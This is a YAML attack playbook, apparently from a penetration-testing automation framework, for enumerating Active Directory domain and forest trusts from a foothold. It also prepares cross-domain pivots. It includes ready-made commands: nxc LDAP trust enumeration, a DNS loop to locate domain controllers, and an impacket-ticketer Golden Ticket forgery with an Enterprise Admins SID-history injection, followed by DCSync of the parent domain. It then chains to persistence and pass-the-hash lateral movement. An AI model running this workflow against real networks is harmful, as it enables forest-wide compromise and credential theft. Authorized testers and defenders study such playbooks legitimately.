id: ad-trust-enumeration
name: "AD — Trust enumeration + cross-domain pivot prep"
description: >
  Once you have a domain foothold, map every trust (parent/child, external,
  forest). Cross-forest paths are often weakly defended and offer the only
  route from a child domain to the forest root.
tags: [recon, trusts, active-directory, cross-forest, enumeration]
difficulty: medium

inputs:
  - name: dc_ip
    source: target_context.ip
    required: true
  - name: domain
    source: target_context.domain
    required: true
  - name: user
    source: target_context.user
    required: true
  - name: password
    source: target_context.password
    required: true

steps:
  - id: enum_trusts_ldap
    name: "Trusts via LDAP"
    command_ref: nxc-ldap-enum-trusts
    inputs:
      dc-ip: "${dc_ip}"
      user: "${user}"
      password: "${password}"
    notes: |
      Important columns:
       - `TrustType` (Forest, Domain, MIT) — Forest trusts cross trees.
       - `TrustDirection` (Inbound, Outbound, Bidirectional).
       - `TrustAttribute` (FOREST_TRANSITIVE, FILTER_SIDS, etc.) — `FILTER_SIDS`
         being ABSENT (i.e. SID filtering disabled) is the green light for
         SID-history injection.
    capture:
      - var: trust_targets
        regex: '\[\+\][^\n]*Trust\s+(?:to|with)\s+([A-Za-z0-9.-]+)'
        match: all

  - id: bloodhound_trusts
    name: "Visualize trusts in BloodHound"
    inline_command: "echo 'In BloodHound: MATCH p=(:Domain)-[r:TrustedBy*1..3]->(:Domain) RETURN p — shows every trust edge as an interactive graph.'"
    notes: |
      The `Domain` nodes have edges of type TrustedBy / SameForestTrust.
      Look for paths from your foothold domain to others.

  - id: dns_lookup
    name: "DNS-resolve every trusted domain to find DCs"
    inline_command: |
      for d in <trust_targets>; do
        echo "=== $d ==="
        nslookup -type=SRV _ldap._tcp.dc._msdcs.$d <dc-ip>
      done
    inputs:
      dc-ip: "${dc_ip}"
    notes: |
      The SRV record returns FQDN+port of every DC in the trusted domain.
      Add them to /etc/hosts so Kerberos works (PKINIT needs the SPN).

  - id: child_to_parent_sid_history
    name: "Child→parent: SID history injection (if you own child DA)"
    inline_command: |
      # Get the Enterprise Admins SID via the parent's domain SID + RID 519:
      # impacket-lookupsid '<child_domain>/<user>:<password>'@<child_dc> 0
      impacket-ticketer \
        -nthash '<krbtgt_nt_hash>' \
        -domain-sid '<child_domain_sid>' \
        -domain '<child_domain>' \
        -extra-sid '<parent_domain_sid>-519' \
        Administrator
    notes: |
      Forges a Golden Ticket in the child with an Enterprise Admins SID in
      the SID history → ticket is accepted by parent DCs because SID
      filtering is off by default INSIDE a forest. From there: DCSync the
      parent.

  - id: forest_trust_external
    name: "External forest trust → look for SID filter quirks"
    inline_command: "# Investigate FILTER_SIDS quarantine flag — if cleared on an external trust, SID-history works cross-forest too. Rare but devastating when present."

references:
  - title: "HackTricks — Domain Trusts"
    url:   "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/domain-trusts.html"
  - title: "SpecterOps — Inter-forest TrustedBy"
    url:   "https://posts.specterops.io/forest-trust-the-things-you-thought-you-knew-23afe6d40c0c"

next_chains:
  - chain: ad-persistence-golden-ticket
    when:   'cross-forest paths open up'
    reason: 'Combine with Golden Ticket + SID history for cross-domain takeover.'
  - chain: pth-lateral-spread
    when:   'reached new domain'
    reason: 'Spread the new identity in the trusted domain.'
